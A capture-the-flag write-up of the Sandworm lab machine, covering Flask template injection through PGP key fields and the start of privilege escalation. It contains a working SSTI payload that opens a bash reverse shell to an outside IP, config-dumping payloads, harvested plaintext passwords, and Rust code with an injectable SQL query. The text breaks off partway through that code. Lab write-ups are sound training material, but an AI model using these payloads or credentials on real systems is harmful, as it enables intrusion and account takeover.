# Reconnaissance
## 443 - ssa.htb
### Possible way in:
- PGP encryption functionality. - SSTI!!!!
	- Generate a new key pair with SSTI in pubkey fields.
	- Sign a message with it.
- Admin page
### Artifacts
```
<textarea cols="80" rows="34" id="signed_message" disabled>
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256
This message has been signed with the official SSA private key.
Import our public key linked above into your keychain and use your favorite program to verify this message. PGP signatures are the only reliable way to verify someone's identity within Cyberspace, and ensure secure and private communication between two parties.
Knowing how to Encrypt/Decrypt messages, as well as verifying them is an imperative skill if you wish to conduct yourself securely, without any prying eyes on you.
Make sure you use verified, open-source programs such as KGpg, Kleopatra, OpenPGP, etc.
And finally, rule number one in asymmetric encryption is to keep your PRIVATE key safe. It is for your eyes only.
SSA
-----BEGIN PGP SIGNATURE-----
iQIzBAEBCAAdFiEE1rqUIwIaCDnMxvPIxh1CkRC2JdQFAmRT2bsACgkQxh1CkRC2
JdTCLhAAqdOcrfOsmkffKwdDKATwEpW1aLXkxYoklkH+DCDc58FgQYDNunMQvXjp
Hd41hbrzQNTm4mMwFfYgFR5oNywAfa0D5L+qTrk05DqwvT7uIZF4/Q/iNp8zElKM
rAVci7c6dBSKLzyGOd7c7/ZnM3Clt4krPGD3L4nQB1Vu7Hav8Oj0R2bL3eaNr0sL
lnj84lbWcGqM9sRfnhfSlpqueK0qbZy02PdzsZ/Ox6KI6s1lAZL5v4eynwrZjXVB
S20SeQAzPr+2m0LGQajPaxYvdEs4BkfyApwzauES0X3bckKdZrXZb/iImQxTrhDq
ZKwGG2qoa6xj4zV32l2JYLKfCcZQh/VE3pslfYb5btuZ/h+oSz6rWT0py/gigbX5
j4ps6gzS16uuVLePyw6kZN2tXgqWqR9IRydCqFJSajwanm9n1I99DH+r9vb7CYOI
PFKwIqynqNX6ddpkCpUl3wgGnUoGdox5DLnE7DZGFM4mOhsNuwd8EBgpU18inFb2
MMZO8Qk5bp2qsK9b4LFWDMEL+pzakgJwA1+H5auJLOak+Xee7UcYeqsq1fjpkwIX
mItshTOG0jrtlvAf/PjqZ54yOPCWoyJQr5ZR7m4bh/kicXZVg5OiWrtVCuN0iUlD
7sXs10Js/pgvZfA6xFipfvs7W+lOQ0febeNmjuKcGk0VVewv8oc=
=/yGe
-----END PGP SIGNATURE-----</textarea>
<p class="mt-2">
                  When verifying our message, you should see something along the lines of:
                </p>
                <div class="bg-light text-center">
                <p>
                Good signature from:<br>
                SSA &lt;atlas@ssa.htb&gt; <br>
                Key ID: D6BA9423021A0839CCC6F3C8C61D429110B625D4

                </p>
```
- PGP public key:
```
-----BEGIN PGP PUBLIC KEY BLOCK-----

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
=P8U3
-----END PGP PUBLIC KEY BLOCK-----
```
- atlas@ssa.htb
# Exploitation
Get all config data with config.items():
```
dict_items([('ENV', 'production'), ('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('SECRET_KEY', '91668c1bc67132e3dcfb5b1a3e0c5c21'), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', False), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('JSON_AS_ASCII', None), ('JSON_SORT_KEYS', None), ('JSONIFY_PRETTYPRINT_REGULAR', None), ('JSONIFY_MIMETYPE', None), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093), ('SQLALCHEMY_DATABASE_URI', 'mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA'), ('SQLALCHEMY_ENGINE_OPTIONS', {}), ('SQLALCHEMY_ECHO', False), ('SQLALCHEMY_BINDS', {}), ('SQLALCHEMY_RECORD_QUERIES', False), ('SQLALCHEMY_TRACK_MODIFICATIONS', False)]) <test@test.com>
gpg: Good signature from "dict_items([('ENV', 'production'), ('DEBUG', False), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('SECRET_KEY', '91668c1bc67132e3dcfb5b1a3e0c5c21'), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', False), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('JSON_AS_ASCII', None), ('JSON_SORT_KEYS', None), ('JSONIFY_PRETTYPRINT_REGULAR', None), ('JSONIFY_MIMETYPE', None), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093), ('SQLALCHEMY_DATABASE_URI', 'mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA'), ('SQLALCHEMY_ENGINE_OPTIONS', {}), ('SQLALCHEMY_ECHO', False), ('SQLALCHEMY_BINDS', {}), ('SQLALCHEMY_RECORD_QUERIES', False), ('SQLALCHEMY_TRACK_MODIFICATIONS', False)])
```
Get all globals and builtins:
```python
{{ self.__init__.__globals__.__builtins__ }}
```
```
{'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'aiter': <built-in function aiter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'anext': <built-in function anext>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': <class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 'EncodingWarning': <class 'EncodingWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2022 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.} gpg: Good signature from "{'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': ModuleSpec(name='builtins', loader=<class '_frozen_importlib.BuiltinImporter'>, origin='built-in'), '__build_class__': <built-in function __build_class__>, '__import__': <built-in function __import__>, 'abs': <built-in function abs>, 'all': <built-in function all>, 'any': <built-in function any>, 'ascii': <built-in function ascii>, 'bin': <built-in function bin>, 'breakpoint': <built-in function breakpoint>, 'callable': <built-in function callable>, 'chr': <built-in function chr>, 'compile': <built-in function compile>, 'delattr': <built-in function delattr>, 'dir': <built-in function dir>, 'divmod': <built-in function divmod>, 'eval': <built-in function eval>, 'exec': <built-in function exec>, 'format': <built-in function format>, 'getattr': <built-in function getattr>, 'globals': <built-in function globals>, 'hasattr': <built-in function hasattr>, 'hash': <built-in function hash>, 'hex': <built-in function hex>, 'id': <built-in function id>, 'input': <built-in function input>, 'isinstance': <built-in function isinstance>, 'issubclass': <built-in function issubclass>, 'iter': <built-in function iter>, 'aiter': <built-in function aiter>, 'len': <built-in function len>, 'locals': <built-in function locals>, 'max': <built-in function max>, 'min': <built-in function min>, 'next': <built-in function next>, 'anext': <built-in function anext>, 'oct': <built-in function oct>, 'ord': <built-in function ord>, 'pow': <built-in function pow>, 'print': <built-in function print>, 'repr': <built-in function repr>, 'round': <built-in function round>, 'setattr': <built-in function setattr>, 'sorted': <built-in function sorted>, 'sum': <built-in function sum>, 'vars': <built-in function vars>, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': <class 'bool'>, 'memoryview': <class 'memoryview'>, 'bytearray': <class 'bytearray'>, 'bytes': <class 'bytes'>, 'classmethod': <class 'classmethod'>, 'complex': <class 'complex'>, 'dict': <class 'dict'>, 'enumerate': <class 'enumerate'>, 'filter': <class 'filter'>, 'float': <class 'float'>, 'frozenset': <class 'frozenset'>, 'property': <class 'property'>, 'int': <class 'int'>, 'list': <class 'list'>, 'map': <class 'map'>, 'object': <class 'object'>, 'range': <class 'range'>, 'reversed': <class 'reversed'>, 'set': <class 'set'>, 'slice': <class 'slice'>, 'staticmethod': <class 'staticmethod'>, 'str': <class 'str'>, 'super': <class 'super'>, 'tuple': <class 'tuple'>, 'type': <class 'type'>, 'zip': <class 'zip'>, '__debug__': True, 'BaseException': <class 'BaseException'>, 'Exception': <class 'Exception'>, 'TypeError': <class 'TypeError'>, 'StopAsyncIteration': <class 'StopAsyncIteration'>, 'StopIteration': <class 'StopIteration'>, 'GeneratorExit': <class 'GeneratorExit'>, 'SystemExit': <class 'SystemExit'>, 'KeyboardInterrupt': <class 'KeyboardInterrupt'>, 'ImportError': <class 'ImportError'>, 'ModuleNotFoundError': <class 'ModuleNotFoundError'>, 'OSError': <class 'OSError'>, 'EnvironmentError': <class 'OSError'>, 'IOError': <class 'OSError'>, 'EOFError': <class 'EOFError'>, 'RuntimeError': <class 'RuntimeError'>, 'RecursionError': <class 'RecursionError'>, 'NotImplementedError': <class 'NotImplementedError'>, 'NameError': <class 'NameError'>, 'UnboundLocalError': <class 'UnboundLocalError'>, 'AttributeError': <class 'AttributeError'>, 'SyntaxError': <class 'SyntaxError'>, 'IndentationError': <class 'IndentationError'>, 'TabError': <class 'TabError'>, 'LookupError': <class 'LookupError'>, 'IndexError': <class 'IndexError'>, 'KeyError': <class 'KeyError'>, 'ValueError': <class 'ValueError'>, 'UnicodeError': <class 'UnicodeError'>, 'UnicodeEncodeError': <class 'UnicodeEncodeError'>, 'UnicodeDecodeError': <class 'UnicodeDecodeError'>, 'UnicodeTranslateError': <class 'UnicodeTranslateError'>, 'AssertionError': <class 'AssertionError'>, 'ArithmeticError': <class 'ArithmeticError'>, 'FloatingPointError': <class 'FloatingPointError'>, 'OverflowError': <class 'OverflowError'>, 'ZeroDivisionError': <class 'ZeroDivisionError'>, 'SystemError': <class 'SystemError'>, 'ReferenceError': <class 'ReferenceError'>, 'MemoryError': <class 'MemoryError'>, 'BufferError': <class 'BufferError'>, 'Warning': <class 'Warning'>, 'UserWarning': <class 'UserWarning'>, 'EncodingWarning': <class 'EncodingWarning'>, 'DeprecationWarning': <class 'DeprecationWarning'>, 'PendingDeprecationWarning': <class 'PendingDeprecationWarning'>, 'SyntaxWarning': <class 'SyntaxWarning'>, 'RuntimeWarning': <class 'RuntimeWarning'>, 'FutureWarning': <class 'FutureWarning'>, 'ImportWarning': <class 'ImportWarning'>, 'UnicodeWarning': <class 'UnicodeWarning'>, 'BytesWarning': <class 'BytesWarning'>, 'ResourceWarning': <class 'ResourceWarning'>, 'ConnectionError': <class 'ConnectionError'>, 'BlockingIOError': <class 'BlockingIOError'>, 'BrokenPipeError': <class 'BrokenPipeError'>, 'ChildProcessError': <class 'ChildProcessError'>, 'ConnectionAbortedError': <class 'ConnectionAbortedError'>, 'ConnectionRefusedError': <class 'ConnectionRefusedError'>, 'ConnectionResetError': <class 'ConnectionResetError'>, 'FileExistsError': <class 'FileExistsError'>, 'FileNotFoundError': <class 'FileNotFoundError'>, 'IsADirectoryError': <class 'IsADirectoryError'>, 'NotADirectoryError': <class 'NotADirectoryError'>, 'InterruptedError': <class 'InterruptedError'>, 'PermissionError': <class 'PermissionError'>, 'ProcessLookupError': <class 'ProcessLookupError'>, 'TimeoutError': <class 'TimeoutError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'copyright': Copyright (c) 2001-2022 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.} " [unknown] [GNUPG:] VALIDSIG F53A9744836CEB738CD20CF64EB64B3EA242634C 2023-10-02 1696282902 0 4 0 1 10 01 F53A9744836CEB738CD20CF64EB64B3EA242634C [GNUPG:] TRUST_UNDEFINED 0 pgp gpg: WARNING: This key is not certified with a trusted signature! gpg: There is no indication that the signature belongs to the owner. Primary key fingerprint: F53A 9744 836C EB73 8CD2 0CF6 4EB6 4B3E A242 634C
```
Trying to exec something:
```python
{{ self.__init__.__globals__.__builtins__.exec("whoami") }}
```
Exploit:
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.146/4444 0>&1"') }}
```
# Privilege Escalation
```
msg = gpg.decrypt(tip, passphrase='$M1DGu4rD$')
```
```
atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ cat admin.json

cat admin.json

{

    "__meta__": {

        "about": "HTTPie session file",

        "help": "https://httpie.io/docs#sessions",

        "httpie": "2.6.0"

    },

    "auth": {

        "password": "quietLiketheWind22",

        "type": null,

        "username": "silentobserver"

    },

    "cookies": {

        "session": {

            "expires": null,

            "path": "/",

            "secure": false,

            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"

        }

    },

    "headers": {

        "Accept": "application/json, */*;q=0.5"

    }

}
```
tipnet main.rs:
```
fn connect_to_db(db: &str) -> Result<mysql::PooledConn> {

    let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream";

    let pool = Pool::new(url).unwrap();

    let mut conn = pool.get_conn().unwrap();

    return Ok(conn);

}
```
```rust
extern crate logger;

use sha2::{Digest, Sha256};

use chrono::prelude::*;

use mysql::*;

use mysql::prelude::*;

use std::fs;

use std::process::Command;

use std::io;

  

// We don't spy on you... much.

  

struct Entry {

    timestamp: String,

    target: String,

    source: String,

    data: String,

}

  

fn main() {

    println!("                                                     

             ,,                                      

MMP\"\"MM\"\"YMM db          `7MN.   `7MF'         mm    

P'   MM   `7               MMN.    M           MM    

     MM    `7MM `7MMpdMAo. M YMb   M  .gP\"Ya mmMMmm  

     MM      MM   MM   `Wb M  `MN. M ,M'   Yb  MM    

     MM      MM   MM    M8 M   `MM.M 8M\"\"\"\"\"\"  MM    

     MM      MM   MM   ,AP M     YMM YM.    ,  MM    

   .JMML.  .JMML. MMbmmd'.JML.    YM  `Mbmmd'  `Mbmo 

                  MM                                 

                .JMML.                               

  

");

  

  

    let mode = get_mode();

    if mode == "" {

    return;

    }

    else if mode != "upstream" && mode != "pull" {

        println!("[-] Mode is still being ported to Rust; try again later.");

        return;

    }

  

    let mut conn = connect_to_db("Upstream").unwrap();

  

  

    if mode == "pull" {

        let source = "/var/www/html/SSA/SSA/submissions";

        pull_indeces(&mut conn, source);

        println!("[+] Pull complete.");

        return;

    }

  

    println!("Enter keywords to perform the query:");

    let mut keywords = String::new();

    io::stdin().read_line(&mut keywords).unwrap();

  

    if keywords.trim() == "" {

        println!("[-] No keywords selected.\n\n[-] Quitting...\n");

        return;

    }

  

    println!("Justification for the search:");

    let mut justification = String::new();

    io::stdin().read_line(&mut justification).unwrap();

  

    // Get Username 

    let output = Command::new("/usr/bin/whoami")

        .output()

        .expect("nobody");

  

    let username = String::from_utf8(output.stdout).unwrap();

    let username = username.trim();

  

    if justification.trim() == "" {

        println!("[-] No justification provided. TipNet is under 702 authority; queries don't need warrants, but need to be justified. This incident has been logged and will be reported.");

        logger::log(username, keywords.as_str().trim(), "Attempted to query TipNet without justification.");

        return;

    }

  

    logger::log(username, keywords.as_str().trim(), justification.as_str());

  

    search_sigint(&mut conn, keywords.as_str().trim());

  

}

  

fn get_mode() -> String {

  

let valid = false;

let mut mode = String::new();

  

while ! valid {

mode.clear();

  

println!("Select mode of usage:");

print!("a) Upstream \nb) Regular (WIP)\nc) Emperor (WIP)\nd) SQUARE (WIP)\ne) Refresh Indeces\n");

  

io::stdin().read_line(&mut mode).unwrap();

  

match mode.trim() {

"a" => {

      println!("\n[+] Upstream selected");

      return "upstream".to_string();

}

"b" => {

      println!("\n[+] Muscular selected");

      return "regular".to_string();

}

"c" => {

      println!("\n[+] Tempora selected");

      return "emperor".to_string();

}

"d" => {

println!("\n[+] PRISM selected");

return "square".to_string();

}

"e" => {

println!("\n[!] Refreshing indeces!");

return "pull".to_string();

}

"q" | "Q" => {

println!("\n[-] Quitting");

return "".to_string();

}

_ => {

println!("\n[!] Invalid mode: {}", mode);

}

}

}

return mode;

}

  

fn connect_to_db(db: &str) -> Result<mysql::PooledConn> {

    let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream";

    let pool = Pool::new(url).unwrap();

    let mut conn = pool.get_conn().unwrap();

    return Ok(conn);

}

  

fn search_sigint(conn: &mut mysql::PooledConn, keywords: &str) {

    let keywords: Vec<&str> = keywords.split(" ").collect();

    let mut query = String::from("SELECT timestamp, target, source, data FROM SIGINT WHERE ");

  

    for (i, keyword) in keywords.iter().enumerate() {

        if i > 0 {

            query.push_str("OR ");

        }

        query.push_str(&format!("data LIKE '%{}%' ", keyword));

    }

    let selected_entries = conn.query_map(

        query,

        |(timestamp, target, source, data)| {

            Entry { timestamp, target, source, data }

        },

        ).expect("Query failed.");

    for e in selected_entries {

        println!("[{}] {} ===> {} | {}",

                 e.timestamp, e.source, e.target, e.data);

    }

}

  

fn pull_indeces(conn: &mut mysql::PooledConn, directory: &str) {

    let paths = fs::read_dir(directory)

        .unwrap()

        .filter_map(|entry| entry.ok())

        .filter(|entry| entry.path().extension().unwrap_or_default() == "txt")

